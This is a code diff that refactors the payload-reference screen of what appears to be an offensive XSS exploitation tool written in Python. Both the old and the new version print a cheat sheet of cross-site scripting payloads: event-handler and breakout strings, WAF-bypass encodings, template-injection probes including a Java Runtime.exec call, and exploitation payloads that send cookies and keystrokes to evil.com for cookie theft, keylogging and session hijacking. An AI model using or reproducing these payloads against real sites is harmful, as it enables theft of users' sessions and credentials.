@@ -101,101 +101,80 @@ def run_exploitation_mode():
 
 def show_reference():
     clear_screen()
-    print(f"""
-{Fore.CYAN}{Fore.BRIGHT}
-╔═══════════════════════════════════════════════════════════════════════════╗
-║                    XSS PAYLOADS REFERENCE                                ║
-╚═══════════════════════════════════════════════════════════════════════════╝
-{Fore.RESET}
+    C = Fore.CYAN
+    Y = Fore.YELLOW
+    W = Fore.WHITE
+    G = Fore.GREEN
+    R = Fore.RED
+    B = Fore.BRIGHT
+    X = Fore.RESET
+    D = "=" * 70
 
-{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                         BASIC PAYLOADS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}
+    print(C + B)
+    print(chr(9546) * 71)
+    print("  " + B + "XSS PAYLOADS REFERENCE".center(67) + X)
+    print(chr(9552) * 71)
+    print(X)
 
-  {Fore.WHITE}<script>alert(1)</script>{Fore.RESET}
-  {Fore.WHITE}<script>alert(document.cookie)</script>{Fore.RESET}
-  {Fore.WHITE}<img src=x onerror=alert(1)>{Fore.RESET}
-  {Fore.WHITE}<svg onload=alert(1)>{Fore.RESET}
-  {Fore.WHITE}<body onload=alert(1)>{Fore.RESET}
+    print(Y + "--- BASIC PAYLOADS " + "-" * 50 + X)
+    print("  " + W + "<script>alert(1)</script>" + X)
+    print("  " + W + "<script>alert(document.cookie)</script>" + X)
+    print("  " + W + "<img src=x onerror=alert(1)>" + X)
+    print("  " + W + "<svg onload=alert(1)>" + X)
+    print("  " + W + "<body onload=alert(1)>" + X)
 
-{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                      ATTRIBUTE BREAKOUT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}
+    print(Y + "--- ATTRIBUTE BREAKOUT " + "-" * 47 + X)
+    print("  " + W + '" onmouseover="alert(1)"' + X)
+    print("  " + W + "' onmouseover='alert(1)'" + X)
+    print("  " + W + '" onfocus="alert(1)" autofocus="' + X)
+    print("  " + W + '" onclick="alert(1)"' + X)
 
-  {Fore.WHITE}" onmouseover="alert(1)"{Fore.RESET}
-  {Fore.WHITE}' onmouseover='alert(1)'{Fore.RESET}
-  {Fore.WHITE}" onfocus="alert(1)" autofocus="{Fore.RESET}
-  {Fore.WHITE}" onclick="alert(1)"{Fore.RESET}
+    print(Y + "--- JAVASCRIPT BREAKOUT " + "-" * 45 + X)
+    print("  " + W + "';alert(1)//" + X)
+    print("  " + W + '";alert(1)//' + X)
+    print("  " + W + "';alert(1);var x='" + X)
 
-{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                     JAVASCRIPT BREAKOUT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}
+    print(Y + "--- WAF BYPASS " + "-" * 54 + X)
+    print("  " + W + "<ScRiPt>alert(1)</ScRiPt>" + X + "              (Case variation)")
+    print("  " + W + "<scr<script>ipt>alert(1)</scr</script>ipt>" + X + "  (Nested tags)")
+    print("  " + W + "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;" + X + " (HTML entities)")
+    print("  " + W + "<script>alert&#96;1&#96;</script>" + X + "            (Backtick)")
+    print("  " + W + '<script>eval(atob("YWxlcnQoMSk="))</script>' + X + " (Base64)")
 
-  {Fore.WHITE}';alert(1)//{Fore.RESET}
-  {Fore.WHITE}";alert(1)//{Fore.RESET}
-  {Fore.WHITE}';alert(1);var x='{Fore.RESET}
+    print(Y + "--- URL PROTOCOLS " + "-" * 50 + X)
+    print("  " + W + "javascript:alert(1)" + X)
+    print("  " + W + "data:text/html,<script>alert(1)</script>" + X)
+    print("  " + W + "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" + X)
 
-{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                       WAF BYPASS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}
+    print(Y + "--- FRAMEWORK-SPECIFIC " + "-" * 46 + X)
+    print("  " + G + "PHP:" + X)
+    print("    " + W + '<?php echo "<script>alert(1)</script>"; ?>' + X)
+    print("    " + W + "{{config.items()}}" + X)
+    print("  " + G + "Python/Django:" + X)
+    print("    " + W + '"".__class__.__mro__[1].__subclasses__()' + X)
+    print("    " + W + "self.__init__.__globals__" + X)
+    print("  " + G + "Java:" + X)
+    print("    " + W + '<%= Runtime.getRuntime().exec("calc") %>' + X)
+    print("    " + W + "${7*7}" + X)
+    print("  " + G + "React:" + X)
+    print("    " + W + "{alert(1)}" + X)
+    print("    " + W + "javascript:alert(1)" + X)
+    print("  " + G + "Angular:" + X)
+    print("    " + W + '{{constructor.constructor("return this")().alert(1)}}' + X)
+    print("  " + G + "Vue.js:" + X)
+    print("    " + W + "<svg @load=alert(1)>" + X)
+    print("    " + W + "v-on:load=alert(1)" + X)
 
-  {Fore.WHITE}<ScRiPt>alert(1)</ScRiPt>{Fore.RESET}                    (Case variation)
-  {Fore.WHITE}<scr<script>ipt>alert(1)</scr</script>ipt>{Fore.RESET}      (Nested tags)
-  {Fore.WHITE}&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;{Fore.RESET} (HTML entities)
-  {Fore.WHITE}<script>alert&#96;1&#96;</script>{Fore.RESET}                  (Backtick)
-  {Fore.WHITE><script>eval(atob("YWxlcnQoMSk="))</script>{Fore.RESET} (Base64)
+    print(Y + "--- EXPLOITATION " + "-" * 51 + X)
+    print("  " + R + "Cookie Stealing:" + X)
+    print("    " + W + '<script>fetch("http://evil.com/?c="+document.cookie)</script>' + X)
+    print("  " + R + "Keylogging:" + X)
+    print("    " + W + '<script>document.onkeypress=function(e){fetch("http://evil.com/?k="+e.key)};</script>' + X)
+    print("  " + R + "Session Hijacking:" + X)
+    print("    " + W + '<script>document.location="http://evil.com/?c="+document.cookie</script>' + X)
 
-{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                      URL PROTOCOLS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}
-
-  {Fore.WHITE}javascript:alert(1){Fore.RESET}
-  {Fore.WHITE}data:text/html,<script>alert(1)</script>{Fore.RESET}
-  {Fore.WHITE}data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=={Fore.RESET}
-
-{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                    FRAMEWORK-SPECIFIC
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}
-
-  {Fore.GREEN}PHP:{Fore.RESET}
-    {Fore.WHITE}<?php echo "<script>alert(1)</script>"; ?>{Fore.RESET}
-    {Fore.WHITE}{{config.items()}}{Fore.RESET}
-
-  {Fore.GREEN}Python/Django:{Fore.RESET}
-    {Fore.WHITE}{{ "".__class__.__mro__[1].__subclasses__() }}{Fore.RESET}
-    {Fore.WHITE}{{ self.__init__.__globals__ }}{Fore.RESET}
-
-  {Fore.GREEN}Java:{Fore.RESET}
-    {Fore.WHITE}<%= Runtime.getRuntime().exec("calc") %>{Fore.RESET}
-    {Fore.WHITE}${7*7}{Fore.RESET}
-
-  {Fore.GREEN}React:{Fore.RESET}
-    {Fore.WHITE}{{alert(1)}}{Fore.RESET}
-    {Fore.WHITE}javascript:alert(1){Fore.RESET}
-
-  {Fore.GREEN}Angular:{Fore.RESET}
-    {Fore.WHITE}{{constructor.constructor("return this")().alert(1)}}{Fore.RESET}
-
-  {Fore.GREEN}Vue.js:{Fore.RESET}
-    {Fore.WHITE}<svg @load=alert(1)>{Fore.RESET}
-    {Fore.WHITE>v-on:load=alert(1){Fore.RESET}
-
-{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                       EXPLOITATION
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}
-
-  {Fore.RED}Cookie Stealing:{Fore.RESET}
-    {Fore.WHITE}<script>fetch("http://evil.com/?c="+document.cookie)</script>{Fore.RESET}
-
-  {Fore.RED}Keylogging:{Fore.RESET}
-    {Fore.WHITE}<script>document.onkeypress=function(e){{fetch("http://evil.com/?k="+e.key)}};{Fore.RESET}
-
-  {Fore.RED}Session Hijacking:{Fore.RESET}
-    {Fore.WHITE}<script>document.location="http://evil.com/?c="+document.cookie</script>{Fore.RESET}
-
-{Fore.CYAN}{'='*70}{Fore.RESET}
-""")
-    input(f"\n{Fore.WHITE}Press Enter to return to menu...{Fore.RESET}")
+    print(C + D + X)
+    input(W + "\nPress Enter to return to menu..." + X)
 
 def main():
     while True:
